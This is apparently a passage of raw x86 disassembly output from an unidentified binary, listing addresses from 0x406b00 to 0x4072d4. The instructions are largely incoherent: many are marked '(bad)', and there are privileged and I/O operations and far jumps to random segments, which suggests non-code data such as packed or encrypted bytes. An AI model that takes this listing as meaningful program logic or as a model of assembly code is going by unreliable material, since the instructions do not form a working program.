  406b00:	arpl   WORD PTR [eax+0x1f5c7517],sp
  406b06:	enter  0x2e7a,0x1a
  406b0a:	mov    ebp,0xc65ab1b7
  406b0f:	(bad)  [edi-0x7124c457]
  406b15:	iret   
  406b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b17:	mov    al,ds:0x3c7a1e9b
  406b1c:	clc    
  406b1d:	jp     0x406afb
  406b1f:	cmp    eax,0xba582af5
  406b24:	sahf   
  406b25:	retf   
  406b26:	mov    edi,0xbe1fd56e
  406b2b:	(bad)  
  406b2c:	fist   DWORD PTR [ecx]
  406b2e:	pop    edx
  406b2f:	out    0x27,eax
  406b31:	clc    
  406b32:	or     BYTE PTR [ebx-0x20fa814f],dl
  406b38:	adc    eax,0x76ba064f
  406b3d:	leave  
  406b3e:	sbb    eax,DWORD PTR cs:[ebx]
  406b41:	jbe    0x406b9b
  406b43:	xchg   ecx,eax
  406b44:	xchg   ecx,eax
  406b45:	(bad)  
  406b46:	js     0x406b6c
  406b48:	cdq    
  406b49:	ret    
  406b4a:	or     DWORD PTR [ebp+0x6176e80e],eax
  406b50:	gs pusha 
  406b52:	mov    esp,0x4ec006c4
  406b57:	mov    ah,0x95
  406b59:	sub    BYTE PTR [edi+0x5e51556d],0x9e
  406b60:	xchg   BYTE PTR [esi+edx*8+0x3ae6e0e1],bl
  406b67:	xor    eax,0x3e4388c0
  406b6c:	sbb    eax,0xd855e721
  406b71:	lods   eax,DWORD PTR ds:[esi]
  406b72:	fstp   TBYTE PTR [ebx]
  406b74:	mov    ?,WORD PTR [esi]
  406b76:	addr16 sbb dl,dl
  406b79:	imul   eax,esp,0x61ee67ba
  406b7f:	pop    edi
  406b80:	xchg   edx,eax
  406b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b82:	mov    cl,0xfe
  406b84:	cwde   
  406b85:	stos   DWORD PTR es:[edi],eax
  406b86:	add    BYTE PTR [ebx-0x1581a235],al
  406b8c:	cmp    DWORD PTR ds:0xc6256a21,0xe634a953
  406b96:	inc    esi
  406b97:	xor    al,0x79
  406b99:	add    BYTE PTR [eax-0x67],0xe6
  406b9d:	jb     0x406ba2
  406b9f:	retf   
  406ba0:	enter  0xb143,0xf8
  406ba4:	push   es
  406ba5:	sbb    eax,0xe5f41c75
  406baa:	out    0x61,al
  406bac:	xchg   esp,eax
  406bad:	add    al,0x92
  406baf:	test   ch,dl
  406bb1:	add    al,0x69
  406bb3:	add    ah,bl
  406bb5:	jp     0x406b77
  406bb7:	push   ss
  406bb8:	jae    0x406c05
  406bba:	mov    ebx,?
  406bbc:	mov    dh,0xb0
  406bbe:	mov    al,ds:0x3004574b
  406bc3:	pusha  
  406bc4:	(bad)  
  406bc5:	xchg   ebp,eax
  406bc6:	jecxz  0x406bfa
  406bc8:	xchg   edi,eax
  406bc9:	jge    0x406b71
  406bcb:	ins    DWORD PTR es:[edi],dx
  406bcc:	jg     0x406b73
  406bce:	dec    eax
  406bcf:	imul   edi,DWORD PTR [edi+eiz*1+0x7],0xba0c2f0
  406bd7:	mov    WORD PTR fs:[ebp+0x72cdb326],cs
  406bde:	outs   dx,DWORD PTR ds:[esi]
  406bdf:	test   al,0x64
  406be1:	leave  
  406be2:	setl   BYTE PTR [eax]
  406be5:	sub    al,0xc8
  406be7:	or     ah,ch
  406be9:	bound  edx,QWORD PTR [ebx+edi*1-0x2b]
  406bed:	cdq    
  406bee:	leave  
  406bef:	add    DWORD PTR [esi-0xc],ecx
  406bf2:	dec    ebx
  406bf3:	xchg   esi,eax
  406bf4:	hlt    
  406bf5:	mov    dl,bh
  406bf7:	xor    eax,0xab1c5791
  406bfc:	aam    0x2b
  406bfe:	xor    DWORD PTR [edi+0x78fc5c0a],0x3b
  406c05:	mov    ebx,0xa01d942e
  406c0a:	int    0xb2
  406c0c:	(bad)  
  406c0d:	in     eax,0x9f
  406c0f:	aad    0x22
  406c11:	pop    edx
  406c12:	jne    0x406bc8
  406c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c15:	mov    ds:0x42fe55d,eax
  406c1a:	aam    0x8b
  406c1c:	pop    es
  406c1d:	mov    ds:0x7fbe3559,al
  406c22:	inc    ebp
  406c23:	repnz test BYTE PTR [esi+0xc],bh
  406c27:	cmc    
  406c28:	das    
  406c29:	mov    ds:0x770b2731,al
  406c2e:	into   
  406c2f:	mov    DWORD PTR [ebx+0x34],ecx
  406c32:	cmc    
  406c33:	sub    eax,0xd0ece7ea
  406c38:	movzx  edx,bh
  406c3b:	sbb    ebx,DWORD PTR [ebx-0x7f]
  406c3e:	push   es
  406c3f:	dec    edx
  406c40:	cmp    BYTE PTR [ebx-0x334cb1c],ch
  406c46:	test   al,0x29
  406c48:	shl    DWORD PTR [esi+edx*4],cl
  406c4b:	pop    ebx
  406c4c:	lods   al,BYTE PTR ds:[esi]
  406c4d:	push   esi
  406c4e:	mov    eax,ds:0x2d838bd5
  406c53:	in     al,dx
  406c54:	mov    eax,ds:0x695fd5f0
  406c59:	ret    0x794f
  406c5c:	jne    0x406be8
  406c5e:	cmc    
  406c5f:	sar    DWORD PTR [ebp-0x6eefdde4],1
  406c65:	gs loopne 0x406cd0
  406c68:	cmp    al,BYTE PTR [ebx]
  406c6a:	lds    ebp,FWORD PTR [ebp+0x7f]
  406c6d:	sub    DWORD PTR [ebx-0x62227d60],edx
  406c73:	stc    
  406c74:	into   
  406c75:	inc    ebx
  406c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c77:	push   0xffffffb4
  406c79:	mov    dl,0xd3
  406c7b:	push   es
  406c7c:	pop    ebx
  406c7d:	inc    ebx
  406c7e:	mov    DWORD PTR [ebp*2-0x8c19043],esi
  406c85:	les    ebp,FWORD PTR [ebx]
  406c87:	jmp    0x17dd:0x77a814a6
  406c8e:	rol    BYTE PTR [edx-0x71be7465],1
  406c94:	dec    esp
  406c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c96:	adc    BYTE PTR [esi+0x77],al
  406c99:	push   es
  406c9a:	xadd   bh,ch
  406c9d:	xor    ah,BYTE PTR [edx+0x4d]
  406ca0:	sub    eax,0x37432c1a
  406ca5:	dec    ebx
  406ca6:	inc    edi
  406ca8:	fdivr  DWORD PTR [edi]
  406caa:	xor    BYTE PTR [eax+eax*8+0x6f6f49d5],dh
  406cb1:	(bad)  
  406cb2:	lock pusha 
  406cb4:	dec    esp
  406cb5:	cmp    al,BYTE PTR [edx]
  406cb7:	dec    ebx
  406cb8:	hlt    
  406cb9:	clc    
  406cba:	(bad)  
  406cbb:	mov    WORD PTR [ebp+0x5a30ce9],gs
  406cc1:	mov    bl,0x7f
  406cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc4:	sub    eax,0x3922aff3
  406cc9:	and    BYTE PTR [ebx-0x24038700],bl
  406ccf:	out    0x9b,al
  406cd1:	dec    esi
  406cd2:	xchg   esp,eax
  406cd3:	and    cl,BYTE PTR [ebx+0x5b]
  406cd6:	add    esi,DWORD PTR [ecx+0x76]
  406cd9:	jb     0x406cc2
  406cdb:	xor    ah,BYTE PTR [esi+0x29769284]
  406ce1:	add    edx,esp
  406ce3:	in     eax,dx
  406ce4:	push   ebx
  406ce5:	mov    esp,0xc09bff10
  406cea:	push   esi
  406ceb:	pop    es
  406cec:	outs   dx,BYTE PTR ds:[esi]
  406ced:	jge    0x406d20
  406cef:	outs   dx,DWORD PTR ds:[esi]
  406cf0:	gs jae 0x406cfb
  406cf3:	push   cs
  406cf4:	fidiv  WORD PTR [esp+ebp*2+0x31f7fbc5]
  406cfb:	jg     0x406cdb
  406cfd:	dec    edx
  406cfe:	mov    bl,0x54
  406d00:	icebp  
  406d01:	std    
  406d02:	les    ebp,FWORD PTR [esi+0x2de24e44]
  406d08:	hlt    
  406d09:	xchg   esi,eax
  406d0a:	jo     0x406cf8
  406d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d0d:	xlat   BYTE PTR ds:[ebx]
  406d0e:	pop    edi
  406d0f:	mov    al,ds:0xf02ed149
  406d14:	or     al,0xb4
  406d16:	call   0x30232bb6
  406d1b:	or     dl,BYTE PTR [ebp+0x3c88d1f4]
  406d21:	pop    esi
  406d22:	sub    BYTE PTR [ecx],ch
  406d24:	jnp    0x406d7e
  406d26:	shl    BYTE PTR [edi],cl
  406d28:	mov    ecx,0xd1ad89f7
  406d2d:	sub    BYTE PTR [ebx+0x56],bl
  406d30:	adc    eax,0xd279f6f0
  406d35:	(bad)  
  406d36:	cli    
  406d37:	ins    DWORD PTR es:[edi],dx
  406d38:	bound  esp,QWORD PTR [edi]
  406d3a:	pop    esp
  406d3b:	(bad)  
  406d3d:	mov    esp,0xac9bedce
  406d42:	mov    eax,0x527be477
  406d47:	dec    edx
  406d48:	shl    DWORD PTR [ebx],1
  406d4a:	and    al,0x53
  406d4c:	(bad)  
  406d4d:	rol    BYTE PTR [eax],1
  406d4f:	rcl    BYTE PTR [esi+0x6c],1
  406d52:	pop    ebp
  406d53:	jnp    0x406d30
  406d55:	(bad)  
  406d56:	call   0x710f3024
  406d5b:	jmp    0x4e3bcde6
  406d60:	in     eax,0x92
  406d62:	repnz (bad) 
  406d64:	shl    ch,0x30
  406d67:	push   ebx
  406d68:	xchg   BYTE PTR [bx+si+0x54],cl
  406d6c:	pop    edi
  406d6d:	add    esp,DWORD PTR [ebx+0x65b8a862]
  406d73:	mov    es,WORD PTR [ebp+edi*4+0x19]
  406d77:	inc    ebx
  406d78:	into   
  406d79:	xlat   BYTE PTR ds:[ebx]
  406d7a:	and    eax,0x8dfd357a
  406d7f:	and    BYTE PTR [ebp-0x46],dh
  406d82:	lods   al,BYTE PTR ds:[esi]
  406d83:	add    al,0x6d
  406d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d86:	xor    bl,BYTE PTR ds:0x18ead2c4
  406d8c:	iret   
  406d8d:	dec    edi
  406d8e:	mov    edi,DWORD PTR [ebp-0x22366f95]
  406d94:	fwait
  406d95:	shl    BYTE PTR [esi+eiz*1+0x6ed23996],cl
  406d9c:	push   ss
  406d9d:	adc    BYTE PTR cs:[esi+ecx*1+0x3f],al
  406da2:	(bad)  
  406da3:	push   edi
  406da4:	data16 sub BYTE PTR [eax],0x26
  406da8:	stos   BYTE PTR es:[edi],al
  406da9:	xor    BYTE PTR [ebx-0x70],dh
  406dac:	out    0xf9,al
  406dae:	mov    dl,0x5f
  406db0:	into   
  406db1:	push   ebx
  406db2:	xor    al,0x80
  406db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db5:	fiadd  DWORD PTR [edi]
  406db7:	sbb    DWORD PTR [eax],ebp
  406db9:	mov    BYTE PTR [ebx-0x739947c1],dl
  406dbf:	retf   
  406dc0:	popa   
  406dc1:	jmp    0x406d88
  406dc3:	or     al,0xc2
  406dc5:	push   es
  406dc6:	or     bl,BYTE PTR [ebx+0x28]
  406dc9:	mov    dh,0xf0
  406dcb:	mov    ecx,0x2bbd0598
  406dd0:	jmp    0x6c682045
  406dd5:	or     bh,BYTE PTR [ecx+0x647c8c61]
  406ddb:	stc    
  406ddc:	inc    esi
  406ddd:	fld    TBYTE PTR [edx+0x9]
  406de0:	dec    edx
  406de1:	xchg   ecx,eax
  406de2:	lods   eax,DWORD PTR ds:[esi]
  406de3:	and    ah,BYTE PTR [ecx]
  406de5:	mov    ecx,0xa13b6007
  406dea:	test   eax,0x899dac29
  406def:	mov    ds:0x8f2e2718,eax
  406df4:	lods   eax,DWORD PTR ds:[esi]
  406df5:	sub    al,BYTE PTR [ecx]
  406df7:	test   al,0xe0
  406df9:	jmp    DWORD PTR [edx-0x50]
  406dfc:	fs data16 (bad) 
  406dff:	mov    esi,0xccabc2a4
  406e04:	sub    eax,0xf0e9ea75
  406e09:	and    eax,0x1d26f696
  406e0e:	jbe    0x406e76
  406e10:	push   eax
  406e11:	xor    dl,ch
  406e13:	mov    edx,0x470c3180
  406e18:	xchg   edx,eax
  406e19:	mov    bh,0x36
  406e1b:	in     eax,0xfd
  406e1d:	in     al,0xc0
  406e1f:	loop   0x406e79
  406e21:	jns    0x406dc9
  406e23:	mov    cl,BYTE PTR [ebp+eiz*4+0x46]
  406e27:	test   eax,0x389d6140
  406e2c:	outs   dx,DWORD PTR ds:[esi]
  406e2d:	dec    DWORD PTR [edx]
  406e2f:	leave  
  406e30:	loopne 0x406dba
  406e32:	jmp    0x406e9b
  406e34:	and    edx,ebx
  406e36:	sbb    eax,0x2dfd9d1a
  406e3b:	xchg   ebp,eax
  406e3c:	mov    esp,0x1d1438de
  406e41:	pop    ebp
  406e42:	sbb    al,0x68
  406e44:	pop    esp
  406e45:	add    eax,0x6aa3d884
  406e4a:	inc    ecx
  406e4b:	outs   dx,BYTE PTR ds:[esi]
  406e4c:	out    dx,eax
  406e4d:	test   eax,0xdd76a167
  406e52:	out    dx,eax
  406e53:	cmp    eax,0x7cc2ca09
  406e58:	xchg   esp,eax
  406e59:	cmp    ch,dl
  406e5b:	inc    eax
  406e5c:	xor    ebp,eax
  406e5e:	pop    edi
  406e5f:	gs enter 0xa17b,0x17
  406e64:	div    edi
  406e66:	mov    ah,0x10
  406e68:	or     ch,BYTE PTR [ecx]
  406e6a:	sub    eax,0x977fb419
  406e6f:	mov    al,0x38
  406e71:	push   ds
  406e72:	or     eax,DWORD PTR [edi+ebx*8+0x5e]
  406e76:	rcr    dl,cl
  406e78:	mov    ecx,0x9c32460
  406e7d:	aaa    
  406e7e:	inc    eax
  406e7f:	jbe    0x406e17
  406e81:	push   ds
  406e82:	nop
  406e83:	mov    edx,0x6606cd4
  406e88:	aad    0x5f
  406e8a:	jge    0x406ee6
  406e8c:	mov    bh,0x7e
  406e8e:	and    BYTE PTR [edi],dl
  406e90:	add    BYTE PTR [edi+0x14],bh
  406e93:	push   esp
  406e94:	push   edi
  406e95:	(bad)
  406e98:	pop    ebx
  406e99:	lods   al,BYTE PTR ds:[esi]
  406e9a:	jb     0x406e41
  406e9c:	add    ebx,ebx
  406e9e:	call   0xd550:0x8364e324
  406ea5:	sbb    al,cl
  406ea7:	xor    al,0xf0
  406ea9:	mov    esp,DWORD PTR [ecx-0x8]
  406eac:	test   DWORD PTR [ebx-0x5e0d3c4],edi
  406eb2:	cmp    al,0x37
  406eb4:	(bad)  
  406eb5:	lods   eax,DWORD PTR ds:[esi]
  406eb6:	pop    esi
  406eb7:	and    DWORD PTR [eax+0x7e19a8ed],ebp
  406ebd:	push   ss
  406ebe:	enter  0x3ceb,0x9e
  406ec2:	in     al,dx
  406ec3:	ds rcr eax,cl
  406ec6:	test   DWORD PTR [edi-0x6b],ebp
  406ec9:	cmp    DWORD PTR [edi],0x52
  406ecc:	arpl   WORD PTR [edx-0x6a1be17d],sp
  406ed2:	jge    0x406f1e
  406ed4:	pop    ebp
  406ed5:	scas   al,BYTE PTR es:[edi]
  406ed6:	dec    ecx
  406ed7:	push   edi
  406ed8:	add    al,0x23
  406eda:	ss sub eax,0x859ad344
  406ee0:	adc    BYTE PTR [edi+0x7a],bl
  406ee3:	add    DWORD PTR [ecx-0x7888ba89],0x417306d9
  406eed:	xchg   ebp,eax
  406eee:	ja     0x406ed1
  406ef0:	mov    al,ds:0x904c5ba9
  406ef5:	mov    ah,0xdb
  406ef7:	adc    eax,0xd024abd6
  406efc:	(bad)  
  406efd:	xchg   BYTE PTR [edx],al
  406eff:	mov    al,ds:0x8b6aea90
  406f04:	inc    ecx
  406f05:	sub    eax,0xa28ddd89
  406f0a:	test   DWORD PTR [ebp+0x68],edx
  406f0d:	sub    DWORD PTR [esi+0x1886e910],0xb6b85937
  406f17:	mov    edi,DWORD PTR [ebp+edi*2-0x5db9c396]
  406f1e:	(bad)  
  406f1f:	mov    dh,0x68
  406f21:	jp     0x406eaf
  406f23:	ret    0xa804
  406f26:	jo     0x406ec0
  406f28:	stos   DWORD PTR es:[edi],eax
  406f29:	mov    ch,0x82
  406f2b:	pop    edx
  406f2c:	loopne 0x406f55
  406f2e:	scas   al,BYTE PTR es:[edi]
  406f2f:	loope  0x406eeb
  406f31:	shr    BYTE PTR cs:[ebx-0x6069aab4],1
  406f38:	cli    
  406f39:	adc    ah,BYTE PTR [ebp+eax*8+0x48]
  406f3d:	mov    eax,ds:0xdd214226
  406f42:	mov    esi,0xaf5cce65
  406f47:	inc    edx
  406f48:	loop   0x406f6d
  406f4a:	dec    edi
  406f4b:	sar    BYTE PTR [ebx+0x6e6ee4ea],cl
  406f51:	(bad)  
  406f52:	aad    0xe
  406f54:	test   eax,0x4c3f4c07
  406f59:	adc    BYTE PTR gs:0x40bd7afb,bl
  406f60:	sub    al,0x57
  406f62:	imul   eax,ecx,0x35
  406f65:	or     edi,edx
  406f67:	jg     0x406efc
  406f69:	mov    bh,0x90
  406f6b:	pop    ebp
  406f6c:	sbb    eax,0xeb16dab9
  406f71:	iret   
  406f72:	mov    edi,0x280f98b0
  406f77:	ret    0xf9af
  406f7a:	sub    BYTE PTR [esi],bl
  406f7c:	paddq  mm2,QWORD PTR [edx]
  406f7f:	pop    esi
  406f80:	test   BYTE PTR [ebx+0x69],ah
  406f83:	aad    0xbb
  406f85:	stc    
  406f86:	cli    
  406f87:	dec    edi
  406f88:	hlt    
  406f89:	lds    ebx,FWORD PTR ds:[bp+si+0x2b]
  406f8e:	por    mm5,QWORD PTR [edi-0x4b]
  406f92:	adc    eax,0x4ca14340
  406f97:	cmp    al,0x2d
  406f99:	ror    DWORD PTR [edi],1
  406f9b:	sbb    BYTE PTR [edi+0x6a],bh
  406f9e:	pop    ds
  406f9f:	pop    ecx
  406fa0:	push   0x157e538c
  406fa5:	sti    
  406fa6:	les    esi,FWORD PTR [eax-0x73]
  406fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406faa:	xchg   edx,eax
  406fab:	call   0x7504:0x367194b1
  406fb2:	cld    
  406fb3:	pop    esp
  406fb4:	(bad)  
  406fb5:	xor    BYTE PTR [eax-0xf],ah
  406fb8:	out    0x50,al
  406fba:	out    dx,eax
  406fbb:	sbb    ebp,DWORD PTR [ebx]
  406fbd:	jb     0x406fc5
  406fbf:	repnz (bad) 
  406fc1:	push   0xe325a2bc
  406fc6:	mov    edx,0x6cda9a11
  406fcb:	repz out 0x15,eax
  406fce:	iret   
  406fcf:	xchg   edi,eax
  406fd0:	retf   0x58a3
  406fd3:	scas   eax,DWORD PTR es:[edi]
  406fd4:	pop    esp
  406fd5:	pop    ds
  406fd6:	popa   
  406fd7:	repnz test al,0xd8
  406fda:	inc    ecx
  406fdb:	jl     0x406ff0
  406fdd:	pushf  
  406fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fdf:	test   al,0xc0
  406fe1:	fisttp WORD PTR [edx-0x57]
  406fe4:	test   ecx,eax
  406fe6:	sbb    BYTE PTR [ebp-0x2e0013ec],0x41
  406fed:	pop    esp
  406fee:	push   ds
  406fef:	dec    ebx
  406ff0:	out    0x7c,al
  406ff2:	adc    DWORD PTR [ebp+eiz*8+0x75],edx
  406ff6:	mov    dl,0xb
  406ff8:	pop    eax
  406ff9:	xor    cl,BYTE PTR [edi-0x7b79adf2]
  406fff:	vmread DWORD PTR [edi+0x701e433c],ebp
  407006:	adc    eax,0x1cbd70eb
  40700b:	sbb    ebp,esp
  40700d:	push   0xca50067c
  407012:	sub    eax,0x249b0720
  407017:	mov    ah,BYTE PTR [esi]
  407019:	mov    ah,0x40
  40701b:	div    DWORD PTR [edx+eiz*1+0x70]
  40701f:	pop    ebp
  407020:	lods   eax,DWORD PTR ds:[esi]
  407021:	add    bh,0x38
  407024:	mov    ch,0x68
  407026:	sub    bh,cl
  407028:	pop    esp
  407029:	sbb    dl,dh
  40702b:	cdq    
  40702c:	ja     0x406ffd
  40702e:	xor    al,0x9c
  407030:	xchg   ecx,eax
  407031:	mov    ah,0x94
  407033:	test   BYTE PTR [ebx+0x6034d5f0],0x73
  40703a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40703b:	test   al,0x95
  40703d:	mov    al,0xd2
  40703f:	mov    ds:0x9771698e,al
  407044:	sbb    edx,ebx
  407046:	fidiv  WORD PTR [ebx+ebx*8+0x5e]
  40704a:	sbb    eax,edx
  40704c:	fisubr WORD PTR [ebx-0x2a5e3a63]
  407052:	or     esp,0x5d7e766d
  407058:	mov    ah,0x5a
  40705a:	sub    al,0x11
  40705c:	dec    esi
  40705d:	gs scas al,BYTE PTR es:[edi]
  40705f:	in     eax,0xcc
  407061:	xor    ch,ah
  407063:	or     ah,cl
  407065:	xlat   BYTE PTR ds:[ebx]
  407066:	shr    BYTE PTR ds:0x66eb3ce8,cl
  40706c:	or     edi,DWORD PTR [ebx-0x47488a46]
  407072:	lds    edx,FWORD PTR [esi+ebx*4-0x73]
  407076:	dec    edi
  407077:	(bad)  
  407078:	add    DWORD PTR [esi+0x6726b1a],0x8883d2c1
  407082:	inc    ebx
  407083:	inc    ecx
  407084:	dec    edx
  407085:	jecxz  0x407034
  407087:	pop    es
  407088:	ret    
  407089:	ins    DWORD PTR es:[edi],dx
  40708a:	ret    0xd86f
  40708d:	pop    esi
  40708e:	inc    edi
  40708f:	jge    0x407061
  407091:	ret    
  407092:	sub    BYTE PTR [edi+0x68],bl
  407095:	rcr    BYTE PTR [esi+0x6a],0x1a
  407099:	ret    
  40709a:	push   ebx
  40709b:	loopne 0x407054
  40709d:	cwde   
  40709e:	repnz cdq 
  4070a0:	cld    
  4070a1:	scas   al,BYTE PTR es:[edi]
  4070a2:	push   ss
  4070a3:	test   al,0x48
  4070a5:	fidiv  WORD PTR [eax]
  4070a7:	mov    edx,0x53c0e196
  4070ac:	and    eax,DWORD PTR [ebp+0x50]
  4070af:	push   eax
  4070b0:	bound  eax,QWORD PTR [ebx+0x7b]
  4070b3:	jb     0x407062
  4070b5:	arpl   cx,ax
  4070b7:	push   esi
  4070b8:	sub    eax,0xc31c342b
  4070bd:	(bad)  
  4070bf:	pop    eax
  4070c0:	fwait
  4070c1:	xchg   edi,eax
  4070c2:	cmp    eax,0xb555de66
  4070c7:	push   eax
  4070c8:	or     DWORD PTR [edi-0x50],edi
  4070cb:	xor    al,0x99
  4070cd:	add    BYTE PTR [esi+0x59],al
  4070d0:	sbb    al,0x42
  4070d2:	sbb    BYTE PTR [ebp+0x69],dh
  4070d5:	test   BYTE PTR [eax+0x3a],0xc8
  4070d9:	ret    0x9758
  4070dc:	dec    esp
  4070dd:	or     DWORD PTR [esp+edx*4],ebx
  4070e0:	out    0xef,al
  4070e2:	pop    edx
  4070e3:	or     eax,0x8fea9ba6
  4070e8:	and    eax,0xbedebff2
  4070ed:	add    al,0x45
  4070ef:	loop   0x407123
  4070f1:	or     BYTE PTR [ebx-0x79],0x1f
  4070f5:	jg     0x407161
  4070f7:	xlat   BYTE PTR ds:[ebx]
  4070f8:	pop    esp
  4070f9:	idiv   BYTE PTR [ebx+ebp*1]
  4070fc:	jmp    0x4070a6
  4070fe:	pop    ebp
  4070ff:	popa   
  407100:	cs or  bh,ah
  407103:	pusha  
  407104:	xchg   esi,eax
  407105:	mov    BYTE PTR [ebx],bh
  407107:	mov    esi,DWORD PTR [ebp-0x27]
  40710a:	popf   
  40710b:	fadd   DWORD PTR [esi]
  40710d:	mov    al,0x2c
  40710f:	mov    WORD PTR gs:[ebp-0x7b441518],cs
  407116:	sbb    al,BYTE PTR [esp+edi*1]
  407119:	push   esp
  40711a:	ja     0x4070bc
  40711c:	add    cl,0xd2
  40711f:	shl    DWORD PTR [edi-0x36c32f46],1
  407125:	sbb    BYTE PTR [ebp+0x7c],bh
  407128:	cmp    DWORD PTR [edx+0xf],ecx
  40712b:	push   0xb1c5c588
  407130:	int    0x3e
  407132:	lods   al,BYTE PTR ds:[esi]
  407133:	outs   dx,BYTE PTR ds:[esi]
  407134:	into   
  407135:	push   eax
  407136:	push   eax
  407137:	into   
  407138:	add    dl,0x2
  40713b:	ss xchg edi,eax
  40713d:	push   es
  40713e:	je     0x40718e
  407140:	call   0x2f75:0xa2f26f0
  407147:	push   esp
  407148:	mov    DWORD PTR [edi+0x39],ecx
  40714b:	mov    ecx,0x74c58750
  407150:	adc    al,0x62
  407152:	je     0x40715a
  407154:	arpl   WORD PTR [ecx+0x38],cx
  407157:	pop    ds
  407158:	mov    ch,bh
  40715a:	(bad)  
  40715b:	(bad)  
  40715d:	sub    DWORD PTR [eax+0x7bdafc47],edx
  407163:	push   eax
  407164:	sub    DWORD PTR [edi+ebx*8],edi
  407167:	adc    eax,0x4fa0f026
  40716c:	add    BYTE PTR [edi+0x2a50693e],0x7f
  407173:	std    
  407174:	outs   dx,DWORD PTR ds:[esi]
  407175:	jbe    0x40713a
  407177:	push   ebp
  407178:	cld    
  407179:	je     0x407194
  40717b:	repz jle 0x4071d8
  40717e:	cdq    
  40717f:	test   ebp,eax
  407181:	mov    ch,0xca
  407183:	xor    DWORD PTR [ecx-0x72],0xe736f8d7
  40718a:	add    eax,0x5ea2b537
  40718f:	push   ss
  407190:	sbb    DWORD PTR [edx],edx
  407192:	mov    dh,0x3a
  407194:	test   BYTE PTR [eax+esi*1-0x4a080606],bh
  40719b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40719d:	add    eax,0x58b9f62e
  4071a2:	sub    ebp,eax
  4071a4:	push   ds
  4071a5:	imul   esi,DWORD PTR [edx+0x185c5b30],0x33ff84a
  4071af:	dec    eax
  4071b0:	pop    ds
  4071b1:	scas   eax,DWORD PTR es:[edi]
  4071b2:	and    DWORD PTR [bx+0xe],esp
  4071b6:	dec    edi
  4071b7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b9:	push   ebx
  4071ba:	(bad)  
  4071bb:	jmp    0x3abca6fe
  4071c0:	mov    bl,0x62
  4071c2:	imul   esi,DWORD PTR [ecx],0x3d258f8f
  4071c8:	mov    cl,0x5b
  4071ca:	bnd call 0x836f573d
  4071d0:	mov    dx,0x1a99
  4071d4:	loope  0x407207
  4071d6:	mov    WORD PTR [ecx],fs
  4071d8:	or     eax,0x902f3c1
  4071dd:	loopne 0x40717e
  4071df:	push   ebx
  4071e0:	sub    DWORD PTR [ecx],0xfc31b919
  4071e6:	dec    edx
  4071e7:	sub    DWORD PTR [esi-0x7a],ebp
  4071ea:	std    
  4071eb:	ror    BYTE PTR [eax],0x33
  4071ee:	add    eax,0x278d4b6
  4071f3:	cld    
  4071f4:	pop    edx
  4071f5:	adc    cl,BYTE PTR [ecx+eiz*2+0x3b]
  4071f9:	mov    al,0xf2
  4071fb:	push   edx
  4071fc:	dec    edx
  4071fd:	imul   ebx,DWORD PTR [edi+0x3c7cf89f],0xb2ba6b17
  407207:	popf   
  407208:	mov    bl,0x9d
  40720a:	out    0x50,eax
  40720c:	retf   0xf4dd
  40720f:	ins    BYTE PTR es:[edi],dx
  407210:	dec    esi
  407211:	mov    ch,0xf8
  407213:	sbb    BYTE PTR [ebx],dl
  407215:	sub    ecx,DWORD PTR [esi+0x56cfd35e]
  40721b:	or     BYTE PTR [esi+0x30101914],0xc8
  407222:	jge    0x40721f
  407224:	fcmovnb st,st(7)
  407226:	add    al,0x10
  407228:	inc    edi
  407229:	and    BYTE PTR [edi+0x274eba08],cl
  40722f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407230:	mov    eax,ds:0x8b29b7af
  407235:	sbb    dl,BYTE PTR [edi]
  407237:	jb     0x4071bf
  407239:	and    eax,0xbe322c35
  40723e:	jbe    0x4072bd
  407240:	ins    DWORD PTR es:[edi],dx
  407241:	out    0xb9,eax
  407243:	shr    DWORD PTR [esi-0x2f0a87f6],1
  407249:	mov    WORD PTR [edi],cs
  40724b:	hlt    
  40724c:	jecxz  0x407224
  40724e:	pop    ds
  40724f:	or     bl,BYTE PTR [esp+eax*8+0x18]
  407253:	pop    ds
  407254:	ret    0x5a1
  407257:	repz jbe 0x4071fa
  40725a:	aaa    
  40725b:	dec    esp
  40725c:	(bad)  
  40725d:	jp     0x40724c
  40725f:	sbb    edi,DWORD PTR [ecx]
  407261:	fwait
  407262:	cmp    BYTE PTR [edx-0x48e923e1],ch
  407268:	push   es
  407269:	or     al,0x60
  40726b:	fldpi  
  40726d:	int3   
  40726e:	mov    esi,0xe66c357d
  407273:	aad    0xbe
  407275:	orps   xmm7,XMMWORD PTR [edx-0x79]
  407279:	mov    ch,0x96
  40727b:	xor    al,0xd9
  40727d:	mov    WORD PTR [ebx-0x380717a9],es
  407283:	ds push es
  407285:	jp     0x40727a
  407287:	fwait
  407288:	sbb    ch,BYTE PTR [ecx+0x5cbe5295]
  40728e:	pop    edi
  40728f:	adc    al,0x7e
  407291:	sbb    al,0x8a
  407293:	fucomp st(3)
  407295:	hlt    
  407296:	sbb    ebx,DWORD PTR [ebp+0x1b3b539a]
  40729c:	sub    BYTE PTR [ebx-0x47f63412],ah
  4072a2:	popf   
  4072a3:	shl    DWORD PTR [ebx],0xc9
  4072a6:	jmp    0x4a26:0xba479549
  4072ad:	(bad)  
  4072af:	cmp    eax,DWORD PTR [ebx+0x5efe6136]
  4072b5:	inc    eax
  4072b6:	(bad)  
  4072b7:	pop    ds
  4072b8:	push   ebx
  4072b9:	adc    al,0xe8
  4072bb:	adc    bh,dh
  4072bd:	pop    es
  4072be:	pop    ds
  4072bf:	iret   
  4072c0:	icebp  
  4072c1:	repz xlat BYTE PTR ds:[ebx]
  4072c3:	jne    0x407280
  4072c5:	or     BYTE PTR ss:[edx+0x933ae2e],cl
  4072cc:	das    
  4072cd:	xor    al,0xd3
  4072cf:	mov    ds:0xa5e6cd83,al
  4072d4:	shl    DWORD PTR [ecx],cl
